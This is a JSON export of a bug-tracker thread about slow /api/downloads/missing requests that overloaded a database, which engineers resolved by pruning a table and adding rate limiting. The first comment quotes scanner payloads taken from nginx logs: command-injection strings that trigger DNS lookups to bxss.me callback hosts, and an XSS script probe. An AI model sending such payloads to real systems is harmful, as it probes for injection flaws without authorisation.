{"comments": {}, "bugs": {"1644473": {"comments": [{"raw_text": "Some requests to /api/downloads/missing or /downloads/missing take a long time. I believe this may be related to the queries they are generating, since at the time I noticed this postgresql cpu utilization was high.\n\nBelow are some sample paths which were slow based on looking at nginx logs. Presumably these requests were generated by a vulnerability scanner.\n\n* `/api/downloads/missing/?page=3&reverse=true&sort=\\\\x22.gethostbyname(lc(\\\\x22hitqf\\\\x22.\\\\x22bevycrqs200b1.bxss.me.\\\\x22)).\\\\x22A\\\\x22.chr(67).chr(hex(\\\\x2258\\\\x22)).chr(109).chr(80).chr(114).chr(86).\\\\x22`\n* `/api/downloads/missing/?page=3'\\\\x22()%26%25<acx><ScRiPt%20>eGfe(9584)</ScRiPt>&reverse=true&sort=count`\n* `/api/downloads/missing/?page=4&reverse=true&sort=%24(nslookup%20hitrhgjsolrgz33473.bxss.me%7C%7Cperl%20-e%20\\\\x22gethostbyname('hitrhgjsolrgz33473.bxss.me')\\\\x22)`\n* `/api/downloads/missing/?page=\\\\x22.gethostbyname(lc(\\\\x22hitfx\\\\x22.\\\\x22oqeyfkgra638a.bxss.me.\\\\x22)).\\\\x22A\\\\x22.chr(67).chr(hex(\\\\x2258\\\\x22)).chr(108).chr(69).chr(115).chr(66).\\\\x22&reverse=true&sort=count`", "creation_time": "2020-06-09T15:45:10Z", "count": 0, "tags": [], "creator": "brian@polibyte.com", "time": "2020-06-09T15:45:10Z", "attachment_id": null, "author": "brian@polibyte.com", "id": 14871922, "text": "Some requests to /api/downloads/missing or /downloads/missing take a long time. I believe this may be related to the queries they are generating, since at the time I noticed this postgresql cpu utilization was high.\n\nBelow are some sample paths which were slow based on looking at nginx logs. Presumably these requests were generated by a vulnerability scanner.\n\n* `/api/downloads/missing/?page=3&reverse=true&sort=\\\\x22.gethostbyname(lc(\\\\x22hitqf\\\\x22.\\\\x22bevycrqs200b1.bxss.me.\\\\x22)).\\\\x22A\\\\x22.chr(67).chr(hex(\\\\x2258\\\\x22)).chr(109).chr(80).chr(114).chr(86).\\\\x22`\n* `/api/downloads/missing/?page=3'\\\\x22()%26%25<acx><ScRiPt%20>eGfe(9584)</ScRiPt>&reverse=true&sort=count`\n* `/api/downloads/missing/?page=4&reverse=true&sort=%24(nslookup%20hitrhgjsolrgz33473.bxss.me%7C%7Cperl%20-e%20\\\\x22gethostbyname('hitrhgjsolrgz33473.bxss.me')\\\\x22)`\n* `/api/downloads/missing/?page=\\\\x22.gethostbyname(lc(\\\\x22hitfx\\\\x22.\\\\x22oqeyfkgra638a.bxss.me.\\\\x22)).\\\\x22A\\\\x22.chr(67).chr(hex(\\\\x2258\\\\x22)).chr(108).chr(69).chr(115).chr(66).\\\\x22&reverse=true&sort=count`", "bug_id": 1644473, "is_private": false}, {"tags": [], "bug_id": 1644473, "is_private": false, "creator": "willkg@mozilla.com", "time": "2020-06-09T22:26:19Z", "raw_text": "The frontend is a React app and I think it requests that url when showing missing symbols and that's the only place it's used. While it's prefixed with \"API\", I'm pretty sure it's not a supported external API.\n\nI'll toss this in the list of things to look into.", "attachment_id": null, "id": 14873057, "author": "willkg@mozilla.com", "creation_time": "2020-06-09T22:26:19Z", "count": 1, "text": "The frontend is a React app and I think it requests that url when showing missing symbols and that's the only place it's used. While it's prefixed with \"API\", I'm pretty sure it's not a supported external API.\n\nI'll toss this in the list of things to look into."}, {"tags": [], "creator": "brian@polibyte.com", "time": "2020-07-06T20:14:53Z", "raw_text": "We had this happen again today. RDS went to 100% CPU utilization for a while, and the webapp was unavailable while presumably all the workers were tied up fielding these requests.\n\nI'm going to add some rate-limiting as a stopgap.", "creation_time": "2020-07-06T20:14:53Z", "count": 2, "bug_id": 1644473, "is_private": false, "attachment_id": null, "id": 14921629, "author": "brian@polibyte.com", "text": "We had this happen again today. RDS went to 100% CPU utilization for a while, and the webapp was unavailable while presumably all the workers were tied up fielding these requests.\n\nI'm going to add some rate-limiting as a stopgap."}, {"tags": [], "creator": "willkg@mozilla.com", "time": "2020-07-07T20:43:30Z", "raw_text": "The table has 131 million rows in it and doesn't seem to have anything maintaining that data. I opened bug #1651190 to cover that. If we can delete most of the table, the slowness will likely go away and we can undo the rate-limiting.\n\nI'll follow up here after that work is done.", "count": 3, "creation_time": "2020-07-07T20:43:30Z", "bug_id": 1644473, "is_private": false, "id": 14923956, "author": "willkg@mozilla.com", "attachment_id": null, "text": "The table has 131 million rows in it and doesn't seem to have anything maintaining that data. I opened bug #1651190 to cover that. If we can delete most of the table, the slowness will likely go away and we can undo the rate-limiting.\n\nI'll follow up here after that work is done."}, {"raw_text": "We wiped out most of the table on July 17th, 2020. I looked at requests to `/api/downloads/missing/` before and after that date. Sure seems like the timings are much better. However, the huge caveat is that we have rate limiting in place, so I can't do multiple simultaneous requests without hitting rate limiting unless I go out and get myself a bunch of nodes and orchestrate things.\n\nRegardless, Brian wants to leave the rate limiting in permanently.\n\nGiven that, I'm going to close this as FIXED.\n\nAlso, this should have been a P1 since it caused multiple outages.", "count": 4, "creation_time": "2020-07-28T20:17:36Z", "tags": [], "time": "2020-07-28T20:17:36Z", "creator": "willkg@mozilla.com", "author": "willkg@mozilla.com", "id": 14961195, "attachment_id": null, "text": "We wiped out most of the table on July 17th, 2020. I looked at requests to `/api/downloads/missing/` before and after that date. Sure seems like the timings are much better. However, the huge caveat is that we have rate limiting in place, so I can't do multiple simultaneous requests without hitting rate limiting unless I go out and get myself a bunch of nodes and orchestrate things.\n\nRegardless, Brian wants to leave the rate limiting in permanently.\n\nGiven that, I'm going to close this as FIXED.\n\nAlso, this should have been a P1 since it caused multiple outages.", "is_private": false, "bug_id": 1644473}]}}}